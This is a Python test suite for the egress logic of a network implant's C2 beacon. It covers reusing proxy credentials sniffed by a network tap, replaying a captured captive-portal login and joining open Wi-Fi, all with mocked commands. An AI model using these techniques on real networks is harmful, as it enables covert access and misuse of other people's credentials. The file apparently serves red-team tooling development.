#!/usr/bin/env python3
"""The rungs, in cost order: borrow, then the implant's own radio.

Rung 1 is evidence only -- it has no verb and no risk-table row -- so the
verbs start at rung 2.

**Rung 2, borrow.** The host's proxy answered with a credential the tap
saw, and a captive portal answered the way the host answered it.
Reversible; it leaves lines in logs a human *could* read.

**Rung 3, its own radio.** An open SSID, which leaves the tapped port
altogether. Bounded three ways, and each bound is a test below: the
onboard radio only, because a USB adapter is refused on the power budget;
a time-boxed association; and a **scoped** route for this implant's own
traffic. It must never take the global default route -- an implant that
stranded itself off the path it still has is the predecessor design's
hardest anti-goal -- and a failure rolls back every command it ran.

**None of them tests its own result**, and each says so. A verb that
posted a probe of its own would be a second request out of a host where
nothing is getting out, at a moment when the reason is not yet known, and
the next check-in is that probe anyway.

**No secret is ever printed.** The borrow file is 0600 and holds the
passwords; the verb's answer names the account and the proxy.
"""

import io
import json
import os
import shutil
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

REPO_ROOT = Path(__file__).resolve().parent.parent.parent
sys.path.insert(0, str(REPO_ROOT))

from software.c2 import beacon as beacon_mod
from software.c2.beacon import read_way_out_policy
from software.scout import handoff
from software.tests import test_egress_decider as _decider

A_CREDENTIAL = {"kind": "proxy-basic", "user": "corp\\alice",
                "secret": "s3cret", "where": "10.0.0.1:3128"}
A_PORTAL = {"url": "http://portal.lan/login", "body": "user=guest&accept=1",
            "content_type": "application/x-www-form-urlencoded"}


class RungCase(_decider.DeciderCase):
    """A beacon with a state directory, a scout document and a borrow file."""

    def setUp(self):
        super().setUp()
        self.state = tempfile.mkdtemp(prefix="raccoon-rung-")
        self.addCleanup(shutil.rmtree, self.state, ignore_errors=True)

    def beacon(self, hours_dark=24.0, tap=None, borrow=None, **extra):
        block = {"enabled": True, "state_dir": self.state}
        beacon = self.a_beacon(way_out=read_way_out_policy(block), **extra)
        beacon._stuck_cycles = int(hours_dark * 12)
        if tap is not None:
            handoff.write_document(self.state, {
                "version": handoff.DOCUMENT_VERSION,
                "published": __import__("time").time(),
                "evidence": beacon._egress_state(),
                "tap": tap, "identity_pre_spent": False,
                "recommendation": None})
        if borrow is not None:
            handoff.write_borrow(self.state, borrow)
        return beacon


# ── rung 2: borrow ──


class TestTheCredentialVerb(RungCase):
    """Answering a 407 with a credential the host handed over in the clear."""

    def test_with_no_borrow_file_it_declines_and_says_so(self):
        answer = self.beacon()._exec_egress("credential")
        self.assertIn("[error]", answer)
        self.assertIn("scout", answer)

    def test_with_no_usable_credential_it_declines(self):
        # An NTLM header is a challenge-response, so there is no password
        # in it to borrow. Declined with that reason rather than selected
        # and silently useless.
        answer = self.beacon(borrow={"credentials": [
            {"kind": "proxy-ntlm", "user": "", "secret": "",
             "where": "10.0.0.1:3128"}]})._exec_egress("credential")
        self.assertIn("[error]", answer)
        self.assertIn("NTLM", answer)

    def test_an_account_with_no_secret_is_not_usable_either(self):
        # A Negotiate header names the account and carries no password, so
        # the user alone is not enough: selecting it would aim this
        # implant at a proxy with an empty password and spend the attempt.
        beacon = self.beacon(borrow={"credentials": [
            {"kind": "proxy-negotiate", "user": "corp\\alice", "secret": "",
             "where": "10.0.0.1:3128"}]})
        answer = beacon._exec_egress("credential")
        self.assertIn("[error]", answer)
        self.assertIsNone(beacon._proxy_session)

    def test_it_makes_the_credential_the_proxy_this_implant_posts_through(self):
        beacon = self.beacon(borrow={"credentials": [A_CREDENTIAL]})
        answer = beacon._exec_egress("credential")

        self.assertNotIn("[error]", answer)
        proxies = beacon._proxy_session.proxies
        self.assertEqual(proxies["https"],
                         "http://corp%5Calice:s3cret@10.0.0.1:3128")
        self.assertEqual(proxies["http"], proxies["https"])

    def test_its_answer_names_the_account_and_never_the_secret(self):
        beacon = self.beacon(borrow={"credentials": [A_CREDENTIAL]})
        answer = beacon._exec_egress("credential")
        self.assertIn("corp\\alice", answer)
        self.assertIn("10.0.0.1:3128", answer)
        self.assertNotIn("s3cret", answer)

    def test_it_does_not_claim_the_implant_can_now_get_out(self):
        answer = self.beacon(
            borrow={"credentials": [A_CREDENTIAL]})._exec_egress("credential")
        self.assertIn("Not a test", answer)

    def test_it_selects_by_index_and_by_account(self):
        second = dict(A_CREDENTIAL, user="corp\\bob", secret="other")
        borrow = {"credentials": [A_CREDENTIAL, second]}
        for target, user in (("", "corp\\alice"), ("1", "corp\\alice"),
                             ("2", "corp\\bob"), ("corp\\bob", "corp\\bob")):
            with self.subTest(target=target):
                beacon = self.beacon(borrow=borrow)
                answer = beacon._exec_egress(("credential " + target).strip())
                self.assertIn(user, answer)

    def test_an_index_outside_the_list_is_refused_with_the_count(self):
        answer = self.beacon(
            borrow={"credentials": [A_CREDENTIAL]})._exec_egress(
                "credential 7")
        self.assertIn("[error]", answer)
        self.assertIn("1", answer)

    def test_a_build_told_to_connect_directly_refuses_it(self):
        beacon = self.beacon(borrow={"credentials": [A_CREDENTIAL]},
                             proxy_mode="none")
        answer = beacon._exec_egress("credential")
        self.assertIn("[error]", answer)
        self.assertIn("none", answer)
        self.assertIsNone(beacon._proxy_session)

    def test_a_borrow_file_that_is_rubbish_declines_rather_than_raising(self):
        for text in ("", "{not json", "[]", '{"credentials": "alice"}',
                     '{"credentials": [17]}',
                     '{"credentials": [{"kind": "proxy-basic"}]}'):
            with self.subTest(text=text):
                beacon = self.beacon()
                Path(handoff.borrow_path(self.state)).write_text(text)
                self.assertIn("[error]", beacon._exec_egress("credential"))


class TestThePortalVerb(RungCase):
    """A captive portal answered as the host answered it."""

    def post(self, beacon, status=200):
        """Record the one request the verb makes, without making it."""
        asked = []

        def post_raw(url, body, headers, timeout=30):
            asked.append({"url": url, "body": body, "headers": headers,
                          "timeout": timeout})
            return beacon_mod._HttpResponse(status, b"")

        beacon._proxy_session = beacon_mod._HttpSession()
        patcher = mock.patch.object(beacon._proxy_session, "post_raw",
                                    post_raw)
        patcher.start()
        self.addCleanup(patcher.stop)
        return asked

    def test_with_no_recorded_answer_it_declines(self):
        answer = self.beacon()._exec_egress("portal")
        self.assertIn("[error]", answer)
        self.assertIn("portal", answer.lower())

    def test_it_replays_the_recorded_request_once(self):
        beacon = self.beacon(borrow={"portal": A_PORTAL})
        asked = self.post(beacon)
        answer = beacon._exec_egress("portal")

        self.assertEqual(len(asked), 1)
        self.assertEqual(asked[0]["url"], A_PORTAL["url"])
        self.assertEqual(asked[0]["body"], A_PORTAL["body"].encode())
        self.assertEqual(asked[0]["headers"]["Content-Type"],
                         A_PORTAL["content_type"])
        self.assertIn("200", answer)
        self.assertIn("Not a test", answer)

    def test_a_portal_that_refuses_is_reported_and_not_retried(self):
        beacon = self.beacon(borrow={"portal": A_PORTAL})
        asked = self.post(beacon, status=403)
        answer = beacon._exec_egress("portal")
        self.assertEqual(len(asked), 1)
        self.assertIn("403", answer)

    def test_a_request_that_raises_is_reported_rather_than_propagated(self):
        beacon = self.beacon(borrow={"portal": A_PORTAL})
        beacon._proxy_session = beacon_mod._HttpSession()
        with mock.patch.object(beacon._proxy_session, "post_raw",
                               side_effect=OSError("no route")):
            answer = beacon._exec_egress("portal")
        self.assertIn("[error]", answer)
        self.assertIn("no route", answer)

    def test_a_recorded_portal_that_is_rubbish_declines(self):
        for portal in (17, {}, {"url": ""}, {"url": "ftp://x/y", "body": ""},
                       {"url": "http://p/l", "body": 17}):
            with self.subTest(portal=portal):
                beacon = self.beacon(borrow={"portal": portal})
                self.assertIn("[error]", beacon._exec_egress("portal"))

    def test_nothing_is_sent_for_a_record_it_cannot_replay(self):
        # Asserted as "no request was made" and not only as an error
        # string: a guard that let a non-http URL through would still
        # answer `[error]`, because urllib would fail on its own -- after
        # making a connection this verb never meant to make.
        for portal in ({"url": "ftp://files.lan/x", "body": "a=1"},
                       {"url": "http://p/l", "body": 17},
                       {"url": "https://portal.lan/login", "body": "a=1"}):
            with self.subTest(portal=portal):
                beacon = self.beacon(borrow={"portal": portal})
                asked = self.post(beacon)
                self.assertIn("[error]", beacon._exec_egress("portal"))
                self.assertEqual(asked, [])


# ── rung 3: its own radio ──


class RadioCase(RungCase):
    """A beacon whose radio commands are recorded instead of run."""

    LEASE = ("lease {\n  fixed-address 192.168.9.42;\n"
             "  option subnet-mask 255.255.255.0;\n"
             "  option routers 192.168.9.1;\n}\n")

    def radio(self, beacon, fail_at=None, lease=None):
        """Record every argv, and optionally fail one of them."""
        ran = []

        def run(argv, timeout=30):
            ran.append(list(argv))
            if fail_at is not None and fail_at in " ".join(argv):
                return 1, "it refused"
            if argv[0] == "dhclient":
                for index, token in enumerate(argv):
                    if token == "-lf":
                        Path(argv[index + 1]).write_text(
                            self.LEASE if lease is None else lease)
            return 0, ""

        patcher = mock.patch.object(beacon, "_radio_run", run)
        patcher.start()
        self.addCleanup(patcher.stop)
        return ran

    def onboard(self, beacon, iface="wlan0"):
        patcher = mock.patch.object(beacon, "_radio_iface",
                                    lambda: (iface, ""))
        patcher.start()
        self.addCleanup(patcher.stop)

    def open_ssid(self, name="GuestWifi"):
        return {"ssids": [{"ssid": "CorpSecure", "open": False},
                          {"ssid": name, "open": True}]}


class TestTheRadioVerb(RadioCase):
    def test_with_no_onboard_radio_it_declines_and_names_that(self):
        beacon = self.beacon(tap=self.open_ssid())
        with mock.patch.object(beacon, "_radio_iface",
                               lambda: (None, "no wireless interface")):
            answer = beacon._exec_egress("radio")
        self.assertIn("[error]", answer)
        self.assertIn("no wireless interface", answer)

    def test_a_usb_adapter_is_refused_on_the_power_budget(self):
        # 802.3af gives this device about 13 W and it is already bridging
        # and capturing. Raspberry Pi's own note on that class of HAT says
        # it is not quite enough for the hungriest USB peripherals, and
        # hardware/OPEN_QUESTIONS.md adds: this board is that case.
        beacon = self.beacon(tap=self.open_ssid())
        with mock.patch.object(
                beacon, "_radio_iface",
                lambda: (None, "wlan1 is a USB adapter and the 13 W budget "
                               "refuses one")):
            answer = beacon._exec_egress("radio")
        self.assertIn("[error]", answer)
        self.assertIn("USB", answer)
        self.assertIn("13 W", answer)

    def test_with_no_open_ssid_in_the_document_it_declines(self):
        beacon = self.beacon(tap={"ssids": [{"ssid": "CorpSecure",
                                             "open": False}]})
        self.onboard(beacon)
        answer = beacon._exec_egress("radio")
        self.assertIn("[error]", answer)
        self.assertIn("CorpSecure", answer)

    def test_without_a_document_it_declines(self):
        beacon = self.beacon()
        self.onboard(beacon)
        self.assertIn("[error]", beacon._exec_egress("radio"))

    def test_it_associates_and_scopes_the_route_to_this_implant(self):
        beacon = self.beacon(tap=self.open_ssid())
        self.onboard(beacon)
        ran = self.radio(beacon)
        answer = beacon._exec_egress("radio")

        self.assertNotIn("[error]", answer)
        joined = [" ".join(argv) for argv in ran]
        self.assertIn("ip link set wlan0 up", joined)
        self.assertTrue(any("iw dev wlan0 connect GuestWifi" in line
                            for line in joined), joined)
        self.assertIn("ip addr add 192.168.9.42/24 dev wlan0", joined)
        self.assertIn("ip route add default via 192.168.9.1 dev wlan0 "
                      "table 100", joined)
        self.assertIn("ip rule add from 192.168.9.42 table 100", joined)
        self.assertIn("GuestWifi", answer)
        self.assertIn("192.168.9.42", answer)
        self.assertIn("Not a test", answer)

    def test_it_never_takes_the_global_default_route(self):
        # The predecessor design's hardest anti-goal: an implant that
        # strands itself off the path it still has.
        beacon = self.beacon(tap=self.open_ssid())
        self.onboard(beacon)
        ran = self.radio(beacon)
        beacon._exec_egress("radio")
        for argv in ran:
            line = " ".join(argv)
            if "default" in line:
                self.assertIn("table", line,
                              "a route with no table is the global one: %r"
                              % line)
            self.assertNotIn("dhclient -nw", line)

    def test_the_association_is_time_boxed(self):
        beacon = self.beacon(tap=self.open_ssid())
        self.onboard(beacon)
        boxed = []

        def run(argv, timeout=30):
            boxed.append(timeout)
            if argv[0] == "dhclient":
                for index, token in enumerate(argv):
                    if token == "-lf":
                        Path(argv[index + 1]).write_text(self.LEASE)
            return 0, ""

        with mock.patch.object(beacon, "_radio_run", run):
            beacon._exec_egress("radio")
        self.assertTrue(boxed)
        for timeout in boxed:
            self.assertIsNotNone(timeout)
            self.assertLessEqual(timeout, 60)

    def test_a_failure_rolls_back_every_command_it_ran(self):
        beacon = self.beacon(tap=self.open_ssid())
        self.onboard(beacon)
        ran = self.radio(beacon, fail_at="ip rule add")
        answer = beacon._exec_egress("radio")

        self.assertIn("[error]", answer)
        joined = [" ".join(argv) for argv in ran]
        for undo in ("ip route flush table 100",
                     "ip addr del 192.168.9.42/24 dev wlan0",
                     "iw dev wlan0 disconnect",
                     "ip link set wlan0 down"):
            self.assertIn(undo, joined, joined)

    def test_a_failure_to_associate_rolls_back_and_says_which_ssid(self):
        beacon = self.beacon(tap=self.open_ssid())
        self.onboard(beacon)
        ran = self.radio(beacon, fail_at="iw dev wlan0 connect")
        answer = beacon._exec_egress("radio")
        self.assertIn("[error]", answer)
        self.assertIn("GuestWifi", answer)
        self.assertIn("ip link set wlan0 down", [" ".join(a) for a in ran])

    def test_a_lease_with_no_address_rolls_back(self):
        beacon = self.beacon(tap=self.open_ssid())
        self.onboard(beacon)
        ran = self.radio(beacon, lease="lease {\n}\n")
        answer = beacon._exec_egress("radio")
        self.assertIn("[error]", answer)
        self.assertIn("lease", answer.lower())
        self.assertIn("ip link set wlan0 down", [" ".join(a) for a in ran])

    def test_it_takes_the_ssid_it_is_given_when_that_one_is_open(self):
        beacon = self.beacon(tap={"ssids": [
            {"ssid": "GuestWifi", "open": True},
            {"ssid": "Visitors", "open": True}]})
        self.onboard(beacon)
        ran = self.radio(beacon)
        answer = beacon._exec_egress("radio Visitors")
        self.assertIn("Visitors", answer)
        self.assertTrue(any("connect Visitors" in " ".join(a) for a in ran))

    def test_an_ssid_the_document_does_not_call_open_is_refused(self):
        beacon = self.beacon(tap=self.open_ssid())
        self.onboard(beacon)
        answer = beacon._exec_egress("radio CorpSecure")
        self.assertIn("[error]", answer)
        self.assertIn("CorpSecure", answer)


class TestTheRawPostTheReplayUses(unittest.TestCase):
    """`_HttpSession.post_raw`: the bytes go out as they came in.

    Driven through the session's own opener rather than through a patched
    `post_raw`, because the thing under test here *is* `post_raw`: a
    version that sent an empty body would satisfy every test that stands
    it in for itself.
    """

    def captured(self, status=200):
        session = beacon_mod._HttpSession()
        seen = {}

        class FakeOpener(object):
            def open(self, request, timeout=None):
                seen["request"] = request
                seen["timeout"] = timeout
                if status >= 400:
                    raise beacon_mod.urllib.error.HTTPError(
                        request.full_url, status, "no", {},
                        io.BytesIO(b"refused"))

                class Response(object):
                    @staticmethod
                    def getcode():
                        return status

                    @staticmethod
                    def read():
                        return b"ok"
                return Response()

        session._build_opener = lambda: FakeOpener()
        return session, seen

    def test_the_body_and_the_headers_go_out_unchanged(self):
        session, seen = self.captured()
        response = session.post_raw(
            "http://portal.lan/login", b"user=guest&accept=1",
            {"Content-Type": "application/x-www-form-urlencoded"},
            timeout=20)
        self.assertEqual(response.status_code, 200)
        self.assertEqual(seen["request"].data, b"user=guest&accept=1")
        self.assertEqual(seen["request"].get_method(), "POST")
        self.assertEqual(seen["request"].get_header("Content-type"),
                         "application/x-www-form-urlencoded")
        self.assertEqual(seen["timeout"], 20)

    def test_a_refusal_is_an_answer_and_not_an_exception(self):
        session, _ = self.captured(status=403)
        self.assertEqual(session.post_raw("http://portal.lan/login", b"a=1",
                                          {}).status_code, 403)


class TestWhichRadioTheImplantMayUse(unittest.TestCase):
    """`_radio_iface` against a sysfs tree this test owns.

    The onboard-only rule is a power decision, not a preference: 802.3af
    gives this device about 13 W and it is already bridging and capturing.
    So it is read from the real walk rather than from a stand-in -- a
    stand-in would let a version that happily took a USB adapter pass.
    """

    def tree(self, interfaces):
        root = tempfile.mkdtemp(prefix="raccoon-sysfs-")
        self.addCleanup(shutil.rmtree, root, ignore_errors=True)
        for name, (wireless, bus) in interfaces.items():
            iface = os.path.join(root, name)
            os.makedirs(iface)
            if wireless:
                os.makedirs(os.path.join(iface, "wireless"))
            device = os.path.join(root, "devices", bus, name)
            os.makedirs(device)
            os.symlink(device, os.path.join(iface, "device"))
        patcher = mock.patch.object(beacon_mod, "_SYSFS_NET", root)
        patcher.start()
        self.addCleanup(patcher.stop)

    def beacon(self):
        beacon = beacon_mod.Beacon({"c2": {
            "beacon_interval_seconds": 300, "jitter_percent": 0,
            "encryption_key": __import__("base64").b64encode(
                b"\x24" * 32).decode(),
            "proxy": {"mode": "auto"}, "https": {"enabled": False},
            "dns": {"enabled": False}, "smb": {"enabled": False},
            "quic": {"enabled": False}}})
        self.addCleanup(setattr, beacon, "_running", False)
        return beacon

    def test_an_onboard_radio_is_taken(self):
        self.tree({"eth0": (False, "platform"),
                   "wlan0": (True, "platform/soc/mmc")})
        self.assertEqual(self.beacon()._radio_iface(), ("wlan0", ""))

    def test_a_usb_adapter_is_refused_on_the_power_budget(self):
        self.tree({"eth0": (False, "platform"),
                   "wlan1": (True, "platform/usb/1-1.2")})
        iface, problem = self.beacon()._radio_iface()
        self.assertIsNone(iface)
        self.assertIn("wlan1", problem)
        self.assertIn("USB", problem)
        self.assertIn("13 W", problem)

    def test_an_onboard_radio_wins_over_a_usb_one(self):
        self.tree({"wlan0": (True, "platform/soc/mmc"),
                   "wlan1": (True, "platform/usb/1-1.2")})
        self.assertEqual(self.beacon()._radio_iface()[0], "wlan0")

    def test_a_host_with_no_radio_says_so(self):
        self.tree({"eth0": (False, "platform")})
        iface, problem = self.beacon()._radio_iface()
        self.assertIsNone(iface)
        self.assertIn("no wireless interface", problem)

    def test_an_unreadable_interface_list_is_not_an_exception(self):
        with mock.patch.object(beacon_mod, "_SYSFS_NET",
                               "/proc/no-such-place"):
            iface, problem = self.beacon()._radio_iface()
        self.assertIsNone(iface)
        self.assertTrue(problem)


class TestTheVerbsAndTheDispatchAgree(RungCase):
    def test_every_allowed_verb_is_offered_by_the_unknown_action_arm(self):
        offered = self.beacon()._exec_egress("nonesuch")
        for verb in beacon_mod.EGRESS_VERBS:
            with self.subTest(verb=verb):
                self.assertIn("'egress %s" % verb, offered)

    def test_the_allowed_set_is_the_seven_the_rungs_name(self):
        self.assertEqual(
            beacon_mod.EGRESS_VERBS,
            ("proxy", "rediscover", "gsocket", "credential", "portal",
             "radio", "identity"))


if __name__ == "__main__":
    unittest.main()
